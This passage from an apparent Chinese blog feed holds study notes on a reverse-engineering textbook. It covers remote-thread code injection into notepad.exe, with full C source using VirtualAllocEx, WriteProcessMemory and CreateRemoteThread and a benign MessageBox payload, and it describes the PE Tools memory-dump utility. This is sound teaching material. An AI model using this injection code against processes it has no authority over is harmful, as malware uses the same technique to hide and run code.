PTHREAD_PARAM   pParam      = (PTHREAD_PARAM)lParam;<br>    HMODULE         hMod        = <span class="hljs-literal">NULL</span>;<br>    FARPROC         pFunc       = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// LoadLibrary()</span><br>    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="hljs-number">0</span>])(pParam-&gt;szBuf[<span class="hljs-number">0</span>]);    <span class="hljs-comment">// &quot;user32.dll&quot;</span><br>    <span class="hljs-keyword">if</span>( !hMod )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// GetProcAddress()</span><br>    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="hljs-number">1</span>])(hMod, pParam-&gt;szBuf[<span class="hljs-number">1</span>]);  <span class="hljs-comment">// &quot;MessageBoxA&quot;</span><br>    <span class="hljs-keyword">if</span>( !pFunc )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// MessageBoxA()</span><br>    ((PFMESSAGEBOXA)pFunc)(<span class="hljs-literal">NULL</span>, pParam-&gt;szBuf[<span class="hljs-number">2</span>], pParam-&gt;szBuf[<span class="hljs-number">3</span>], MB_OK);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码中实际被注入的部分是ThreadProc()函数（前面的typedef语句是针对C语言语法的，不需要注入）。ThreadProc()函数代码中使用了很多函数指针，乍一看比较复杂，但稍微整理就会发现其实很简单。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">hMod = LoadLibraryA(<span class="hljs-string">&quot;user32.dll&quot;</span>);<br>pFunc = GetProcAddress(hMod, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);<br>pFunc(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;www.reversecore.com&quot;</span>, <span class="hljs-string">&quot;ReverseCore&quot;</span>, MB_OK);<br></code></pre></td></tr></table></figure><p>同时参考代码27-2中的注释，相信大家能够很容易地理解ThreadProc()函数的代码。</p><p>其实，重要的是ThreadProc()代码这一概念。代码注入技术的核心内容是注入可独立运行的代码，为此，需要同时注入代码与（代码中引用的）数据，并且要保证代码能够准确引用注入的数据。从上述代码中的ThreadProc()函数可以看到，函数中并未直接调用相关API，也未直接定义使用字符串，它们都通过THREAD_PARAM结构体以线程参数的形式传递使用。 若ThreadProc()函数在一个普通程序中，其函数代码将非常简单，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">DWORD WINAPI <span class="hljs-title function_">ThreadProc</span><span class="hljs-params">(LPVOID lParam)</span><br>&#123;<br>MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;www.reversecore.com&quot;</span>,<span class="hljs-string">&quot;ReverseCore&quot;</span>,MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译代码27-3后，使用调试器调试生成的文件，如图27-8所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.assets/image-20220223135627662.png" alt="图27-8 ThreadProc()"></p><p>若将图27-8中的代码（10001000~10001018区域）注入其他进程，则代码将无法正常运行。原因在于，代码中引用地址（10009290、1000929C、100080F0 ）的内容并不存在于目标进程。要使代码能够正常工作，必须向相应地址同时注入相关字符串以及API地址。并且通过编程方式使图27-8中的代码也能够准确引用被注入数据的地址。</p><p>为满足这样的条件，在代码27-2的ThreadProc()函数中使用THREAD_PARAM结构体来接收2 个API地址与4个字符串数据。其中2个API分别为LoadLibraryA()与GetProcAddress()，只要有了这2个API，就能够调用所有库函数。</p><blockquote><p>上述示例可以不传递LoadLibraryA()与GetProcAddress()的地址，直接传递MessageBoxA()的地址使用即可。但原则上要先传递LoadLibraryA()与GetProcAddress(),然后使用它们加载需要的DLL，再直接获取要用的函数地址。这种方式的好处在于可以把相关库准确加载到指定进程3若将Windows套接字（Socket） API中的ws2_32!connect()地址传递给notepad.exe进程之后再使用，就会发生运行错误（notepad.exe默认不加载ws2 32.dll）。</p></blockquote><p>大部分用户模式进程都会加载kernel32.dll，所以直接传递LoadLibraryA()与GetProcAddress()的地址不会有什么问题。但是，有些系统进程（如：smss.exe ）是不会加载kernel32.dll的，事前务必确认。 </p><p>像kernel32.dll这样的系统库，在OS启动的状态下，所有进程都会将其加载到相同地址。但是若OS版本不同（Vista、7等），或系统重启后，即使是相同模块，加载地址也会变化。</p><p>使用调试器调试代码27-2中的ThreadProc()函数代码，如图27-9所示。</p><blockquote><p>这里一调试就崩了，还没找到原因，先用书上的图。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.assets/image-20220223141032465.png" alt="图27-9 ThreadProc()函数代码"></p><p>从图27-9中的代码可以看到，所有重要数据都是从线程参数lParam[EBP+8]接收使用的。也就是说，图27-9中的ThreadProc()函数是可以独立运行的代码（不直接引用被硬编码的地址数据）。若将上图27-9与前面介绍过的图27-8比较，可以明显看到它们的不同之处。</p><blockquote><p>Visual C++ 2010 Express Edition 集成开发环境中，根据所用模式“Release&#x2F;Debug” 及“优化”选项的不同，Codeinjection.cpp文件经过编译生成的代码可能与图27-9不同。</p></blockquote><h2 id="27-4-3-lnjectCode-函数"><a href="#27-4-3-lnjectCode-函数" class="headerlink" title="27.4.3 lnjectCode()函数"></a>27.4.3 lnjectCode()函数</h2><p>InjectCode()是代码注入技术的核心部分，以下是其代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">InjectCode</span><span class="hljs-params">(DWORD dwPID)</span><br>&#123;<br>    HMODULE         hMod            = <span class="hljs-literal">NULL</span>;<br>    THREAD_PARAM    param           = &#123;<span class="hljs-number">0</span>,&#125;;<br>    HANDLE          hProcess        = <span class="hljs-literal">NULL</span>;<br>    HANDLE          hThread         = <span class="hljs-literal">NULL</span>;<br>    LPVOID          pRemoteBuf[<span class="hljs-number">2</span>]   = &#123;<span class="hljs-number">0</span>,&#125;;<br>    DWORD           dwSize          = <span class="hljs-number">0</span>;<br><br>    hMod = GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br><br>    <span class="hljs-comment">// set THREAD_PARAM</span><br>    param.pFunc[<span class="hljs-number">0</span>] = GetProcAddress(hMod, <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>    param.pFunc[<span class="hljs-number">1</span>] = GetProcAddress(hMod, <span class="hljs-string">&quot;GetProcAddress&quot;</span>);<br>    strcpy_s(param.szBuf[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;user32.dll&quot;</span>);<br>    strcpy_s(param.szBuf[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;MessageBoxA&quot;</span>);<br>    strcpy_s(param.szBuf[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;www.reversecore.com&quot;</span>);<br>    strcpy_s(param.szBuf[<span class="hljs-number">3</span>], <span class="hljs-string">&quot;ReverseCore&quot;</span>);<br><br>    <span class="hljs-comment">// Open Process</span><br>    <span class="hljs-keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS,   <span class="hljs-comment">// dwDesiredAccess</span><br>                                  FALSE,                <span class="hljs-comment">// bInheritHandle</span><br>                                  dwPID)) )             <span class="hljs-comment">// dwProcessId</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenProcess() fail : err_code = %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// Allocation for THREAD_PARAM</span><br>    dwSize = <span class="hljs-keyword">sizeof</span>(THREAD_PARAM);<br>    <span class="hljs-keyword">if</span>( !(pRemoteBuf[<span class="hljs-number">0</span>] = VirtualAllocEx(hProcess,          <span class="hljs-comment">// hProcess</span><br>                                      <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// lpAddress</span><br>                                      dwSize,               <span class="hljs-comment">// dwSize</span><br>                                      MEM_COMMIT,           <span class="hljs-comment">// flAllocationType</span><br>                                      PAGE_READWRITE)) )    <span class="hljs-comment">// flProtect</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VirtualAllocEx() fail : err_code = %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( !WriteProcessMemory(hProcess,                       <span class="hljs-comment">// hProcess</span><br>                            pRemoteBuf[<span class="hljs-number">0</span>],                  <span class="hljs-comment">// lpBaseAddress</span><br>                            (LPVOID)&amp;param,                 <span class="hljs-comment">// lpBuffer</span><br>                            dwSize,                         <span class="hljs-comment">// nSize</span><br>                            <span class="hljs-literal">NULL</span>) )                         <span class="hljs-comment">// [out] lpNumberOfBytesWritten</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WriteProcessMemory() fail : err_code = %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// Allocation for ThreadProc()</span><br>    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;<br>    <span class="hljs-keyword">if</span>( !(pRemoteBuf[<span class="hljs-number">1</span>] = VirtualAllocEx(hProcess,          <span class="hljs-comment">// hProcess</span><br>                                      <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// lpAddress</span><br>                                      dwSize,               <span class="hljs-comment">// dwSize</span><br>                                      MEM_COMMIT,           <span class="hljs-comment">// flAllocationType</span><br>                                      PAGE_EXECUTE_READWRITE)) )    <span class="hljs-comment">// flProtect</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VirtualAllocEx() fail : err_code = %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( !WriteProcessMemory(hProcess,                       <span class="hljs-comment">// hProcess</span><br>                            pRemoteBuf[<span class="hljs-number">1</span>],                  <span class="hljs-comment">// lpBaseAddress</span><br>                            (LPVOID)ThreadProc,             <span class="hljs-comment">// lpBuffer</span><br>                            dwSize,                         <span class="hljs-comment">// nSize</span><br>                            <span class="hljs-literal">NULL</span>) )                         <span class="hljs-comment">// [out] lpNumberOfBytesWritten</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WriteProcessMemory() fail : err_code = %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( !(hThread = CreateRemoteThread(hProcess,            <span class="hljs-comment">// hProcess</span><br>                                       <span class="hljs-literal">NULL</span>,                <span class="hljs-comment">// lpThreadAttributes</span><br>                                       <span class="hljs-number">0</span>,                   <span class="hljs-comment">// dwStackSize</span><br>                                       (LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="hljs-number">1</span>],     <span class="hljs-comment">// dwStackSize</span><br>                                       pRemoteBuf[<span class="hljs-number">0</span>],       <span class="hljs-comment">// lpParameter</span><br>                                       <span class="hljs-number">0</span>,                   <span class="hljs-comment">// dwCreationFlags</span><br>                                       <span class="hljs-literal">NULL</span>)) )             <span class="hljs-comment">// lpThreadId</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateRemoteThread() fail : err_code = %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    WaitForSingleObject(hThread, INFINITE);<br><br>    CloseHandle(hThread);<br>    CloseHandle(hProcess);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码27.4与DLL注入代码非常相似。InjectCode()函数的set THREAD_PARAM部分用来设置THREAD_PARAM结构体变量，它们会注入目标进程，并且以参数形式传递给ThreadProc()线程函数。</p><blockquote><p>Windows OS中，加载到所有进程的kernel32.dll的地址都相同，所以CodeInjection.exe进程中获取的 API（“LoadLibraryA”、“GetProcAddress”）地址与 notepad.exe 进程中获取的 API （“LoadLibraryA”、“GetProcAddress”）地址是一样的，请记住这一点。</p></blockquote><p>设置好THREAD_PARAM结构体后，接着调用了一系列API函数，其核心API函数归纳整理如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">OpenProcess()<br><span class="hljs-comment">// data : THREAD_PARAM</span><br>VirtualAllocEx()<br>WriteProcessMemory()<br><span class="hljs-comment">// code : ThreadProc()</span><br>VirtualAllocEx()<br>WriteProcessMemory()<br>CreateRemoteThread()<br></code></pre></td></tr></table></figure><p>上述代码主要用来在目标进程中分别为data与code分配内存，并将它们注入目标进程。最后 调用CreateRemoteThread() API,执行远程线程。至此，使用代码注入技术的示例源码讲解完毕。</p><p>为便于说明，我选的示例非常基础、简单，但这丝毫不会影响我们对代码注入技术的学习与理解。恰恰相反，它能帮助我们更快速、更轻松地理解代码注入技术的原理。之后，大家可以多做些相关练习、多思考，形成自己特有的代码注入技术。</p><blockquote><p>我实现代码注入技术时，通常会用汇编语言编写要注入的代码，编写时可以使用复杂些的MASM，也可以使用简单的OllyDbg “汇编”命令（快捷键Space）。编好之后，再使用InjectCode()函数将Hex代码的缓冲区注入目标进程。这种方法更有利于创建更为直观的注入代码。</p></blockquote><h1 id="27-5-代码注入调试练习"><a href="#27-5-代码注入调试练习" class="headerlink" title="27.5 代码注入调试练习"></a>27.5 代码注入调试练习</h1><p>本节将调试代码注入技术，了解代码注入的动态过程。</p><h2 id="27-5-1-调试-notepad-exe"><a href="#27-5-1-调试-notepad-exe" class="headerlink" title="27.5.1 调试 notepad.exe"></a>27.5.1 调试 notepad.exe</h2><p>用OllyDbg开始调试notepad.exe文件。如图27-10所示，按F9运行键，使notepad.exe处于“Runing” （运行）状态。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.assets/image-20220223142659095.png" alt="图27-10 调试notepad.exe进程"></p><h2 id="27-5-2-设置OllyDbg-选项"><a href="#27-5-2-设置OllyDbg-选项" class="headerlink" title="27.5.2 设置OllyDbg 选项"></a>27.5.2 设置OllyDbg 选项</h2><p>代码注入是一种向目标进程创建新线程的技术，如图27-11所示，设置好OllyDbg的选项后，<br>即可从注入的线程代码开始调试。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.assets/image-20220223142747600.png" alt="图27-11 复选Break on new thread"></p><p>从现在开始，每当notepad.exe进程中生成新线程，调试器就暂停在线程函数开始的代码位置。</p><h2 id="27-5-3-运行-Codelnjection-exe"><a href="#27-5-3-运行-Codelnjection-exe" class="headerlink" title="27.5.3 运行 Codelnjection.exe"></a>27.5.3 运行 Codelnjection.exe</h2><p>借助Process Explorer工具查看notepad.exe进程的PID,如图27-12所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.assets/image-20220223143000360.png" alt="图27-12 notepad.exe进程的PID"></p><p>在命令行窗口输入PID作为参数，运行CodeInjection.exe，如图27-13所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.assets/image-20220223143040688.png" alt="图27-13 运行Codelnjection.exe"></p><h2 id="27-5-4-线程开始代码"><a href="#27-5-4-线程开始代码" class="headerlink" title="27.5.4 线程开始代码"></a>27.5.4 线程开始代码</h2><p>运行CodeInjection.exe进程，代码注入成功后，调试器就会暂停在被注入的线程代码的开始位置，如图27-14所示。调试器准确暂停在ThreadProc()函数开始的位置，由此开始调试即可。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.assets/image-20220223145148828.png" alt="图27-14 被注入的ThreadProc()函数"></p><blockquote><p>有时候只是调试器暂停到此处，但是EIP并未设置于此。这时，可以先在ThreadProc()函数开始的地址（8F0000）处设置断点，再按F9运行键，这样运行控制流就会准确到达设有断点的地址（8F0000）处</p></blockquote><p>8F0004地址处的<code>MOV ESI,DWORD PTR SS:[EBP+8]</code>指令中，[EBP+8]地址就是ThreadProc()函数的IParam参数，而参数IParam则指向被一同注入的THREAD_PARAM结构体（参考图27-15）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.assets/image-20220223145123843.png" alt="image-20220223145123843"></p><p>根据不同用户的运行环境，上述地址可能标识有异。</p><h1 id="27-6-小结"><a href="#27-6-小结" class="headerlink" title="27.6 小结"></a>27.6 小结</h1><p>本章我们借助OllyDbg的强大功能学习了调试注入代码的方法，下一章将学习使用汇编语言（非C语言）创建注入代码。</p><p>Q.我不太理解lnjectCode()代码中计算ThreadProc()函数大小的方法。<br>dwSize&#x3D;（DWORD）lnjectCode-（DWORD）ThreadProc;<br>像上面这样计算，不是只把地址值相减了吗？ </p><p>A.在MS Visual C++中使用<strong>Release</strong>模式编译程序代码后，源代码中函数顺序与二进制代码中的顺序是一致的。比如，在源代码中按照Funcl()、Func2()的顺序编写，编译生成二进制代码后，二进制文件中这2个函数的顺序也是如此查看InjectCode.cpp源代码可以注意到，我有意按照ThreadProc()、InjectCode()的顺序编写程序，所以在编译生成的InjectCode.exe文件中，这2个函数也按相同顺序排列出现。又因为函数名称就是函数地址，所以<br>InjectCode-ThreadProc做减法运算后，所得结果就是ThreadProc()函数的大小。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第27章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第26章 PE Tools</title>
    <link href="/1999/02/24/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC26%E7%AB%A0%20PE%20Tools/"/>
    <url>/1999/02/24/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC26%E7%AB%A0%20PE%20Tools/</url>
    
    <content type="html"><![CDATA[<p>第26章 PE Tools<br>本章将讲解一款名称为PE Tools的工具，它是一款功能强大的PE文件编辑工具，具有进程内存转储、PE文件头编辑、PE重建等丰富多样的功能，并且支持插件，带有插件编写示例，用户可以自己开发需要的插件。</p><h1 id="26-1-PE-Tools"><a href="#26-1-PE-Tools" class="headerlink" title="26.1 PE Tools"></a>26.1 PE Tools</h1><p>网站：<a href="http://petools.org.ru/">http://petools.org.ru</a><br>下载路径：<a href="http://petools.org.ru/updates/pt_update_08_rc7.zip">http://petools.org.ru/updates/pt_update_08_rc7.zip</a> （网站已经关闭）</p><p>从PE Tools网站可以推测岀，其制作者为俄罗斯人。运行PE Tools工具，其初始画面如图26-2所示，从其中显示的“REVERSE ENGINEER’S SWISS ARMY KNIFE”（逆向工程师的瑞士军刀）语句可以感受到，它的制作者是多么为之自豪。</p><p>PE Tools工具可以获取系统中正在运行的所有进程的列表，并将之显示在主窗口中，如图26-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC26%E7%AB%A0%20PE%20Tools.assets/image-20220222211114780.png" alt="图26-3 PE Tools主窗口"></p><p>我使用PE Tools的主要目的是利用它的进程内存转储功能，有时修改PE文件头时也会用到。下面简单介绍一下它的主要功能及使用方法。</p><h2 id="26-1-1进程内存转储"><a href="#26-1-1进程内存转储" class="headerlink" title="26.1.1进程内存转储"></a>26.1.1进程内存转储</h2><p>代码逆向分析中经常用到“转储”（Dump） —词，意为“将内存中的内容转存到文件”。这种转储技术主要用来查看正在运行的进程内存中的内容。文件是运行时解压缩文件时，其只有在内存中才以解压缩形态存在，此时借助转储技术可以轻松查看与源文件类似的代码与数据。</p><blockquote><ul><li>使用PE保护器时，文件在内存中仍处于压缩与加密状态，即便应用内存转储技术也往往无法准&gt; 确把握文件内容。并且常常因为使用Anti-Dump （反转储）技术而给转储带来很大困难。 </li><li>在调试器中将正在运行的进程附加进来后，能够直接准确查看进程内存中的内容。而使用PETools的转储功能只是因为它比使用调试器更加容易、方便，特别是查看运行时压缩程序时，通过&gt; 转储功能可以更快速、更简单地查看内存中的字符串等。</li></ul></blockquote><p>从图26-3中可以看到，程序主窗口分为上下两部分，上半部分显示的是正在运行的进程，下半部分显示的是当前所选进程中加载的DLL模块。转储进程的可执行文件映像时，先在上半窗口中选中相应进程，然后单击鼠标右键，弹出快捷菜单（参考图26-4）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC26%E7%AB%A0%20PE%20Tools.assets/image-20220222211509471.png" alt="图26-4 进程映像转储菜单"></p><p>为了更方便地转储，PE Tools为用户提供了如下3个转储选项。</p><p>Dump Full （完整转储）</p><p>使用该选项时，PE Tools会检测进程的PE文件头，并从ImageBase地址开始转储SizeOflmage大小的区域（该区域即是PE文件被加载到内存后的映像大小）。</p><blockquote><p>运行普通PE文件时，其加载到内存中的形态即为PE映像，经常用来与PE文件区分。代码逆向分析人员常常使用这个术语，请务必牢记。</p></blockquote><p>Dump Partial （部分转储）<br>该功能用来从相应进程内存的指定地址开始转储指定大小的部分，转储起始地址与大小在如<br>图26-5所示的窗口中设置。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC26%E7%AB%A0%20PE%20Tools.assets/image-20220222211612581.png" alt="图26-5 部分转储对话框"></p><p>Dump Region （区域转储）<br>进程内存（用户区域）中所有分配区域都被标识为某种状态，区域转储功能用于转储状态（State ）标识为COMMIT的内存区域（参考图26-6 ）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC26%E7%AB%A0%20PE%20Tools.assets/image-20220222211711200.png" alt="图26-6 区域转储对话框"></p><blockquote><p>PE Tools工具在进程内存转储方面大名鼎鼎，因为它在进程转储操作时能有效绕开反转储技术，获得非常好的转储效果。依我的个人经验，使用其他转储工具操作失败时，使用PE Tools往往能够出色完成转储。</p></blockquote><h2 id="26-1-2-PE编辑器"><a href="#26-1-2-PE编辑器" class="headerlink" title="26.1.2 PE编辑器"></a>26.1.2 PE编辑器</h2><p>直接手动修改PE文件时，需要修改PE文件头，此时使用PE Tools的PE编辑器功能会非常方便。使用时拖动目标PE文件，或在工具栏中选择Tools-PE Editor即可。</p><p>从图26-7可以看出，PE编辑器可以列出PE文件头的各种信息，借此可以对其进行详细修改。修改PE文件时，我有时会使用Hex Editor或PE Tools （或者其他PE相关工具）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC26%E7%AB%A0%20PE%20Tools.assets/image-20220222211812081.png" alt="图26-7 PE编辑器对话框"></p><h1 id="26-2小结"><a href="#26-2小结" class="headerlink" title="26.2小结"></a>26.2小结</h1><p>本章主要讲解了有关PE Tools工具的内容，它带有强大的进程内存转储功能，及PE文件头修改功能。虽然这些功能在OllyDbg与Hex Editor中也有，但是PE Tools是一款专用的PE编辑工具，它的这些功能使用起来更加方便。学会灵活运用这些有用的工具对代码逆向分析是十分有帮助的。</p><ul><li><p>PE Tools工具的其他功能不太常用，使用方法也不很直观，甚至还有些Bug, 感兴趣的朋友可以自学。</p></li><li><p>OllyDbg也支持插件，为它设置特定插件（如： OllyDump）也可以进行内存转储。</p></li></ul><blockquote><p>中场休息一代码逆向分析的乐趣</p><p>“光催不煮，生米哪能变熟饭。”</p><p>上面这句话摘自尹五荣的随笔《削棒槌的老人》，大致的含义是：只有经历了必经的过程，才能获得预期的结果。</p><p>想学好代码逆向分析技术，要学的内容非常多，需要投入大量的时间与精力。在这一过程中应当始终保持平和的心态，切忌急躁。急躁容易让人烦躁不安，让人无法面对困难、忍受失败。在学习代码逆向技术的过程中，无时无刻不碰（自己无法预料的）“壁”，要把这些“墙壁”当作挑战，在不断战胜它们的过程中品尝成功的喜悦。我认为这恰恰就是学习代码逆向分析技术的乐趣所在。</p><p>不尽如人意，也不必有压力。<br>代码逆向分析技术本身就‘方尽如人意”。<br>下定决心，平复心绪，一点一点，搜集信息。<br>直到成功，不断努力。<br>头疼了，就稍事休息。<br>重要的是，不要放弃，坚持到底。<br>就像拼图游戏，<br>万事总有解决之理。<br>投入时间精力，终能成功学习。</p><p>突然觉得，所有工程技术的本质属性都是一样的。你投入的时间越多、越努力，这方面的实力就越强，世界万物皆同此理。 </p><p>“投入的时间与精力都会积累成实力。”</p><p>我认为这就是学习代码逆向分析技术的乐趣所在，各位又是怎么想的呢？</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第26章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第25章 通过修改PE加载DLL</title>
    <link href="/1999/02/23/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL/"/>
    <url>/1999/02/23/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL/</url>
    
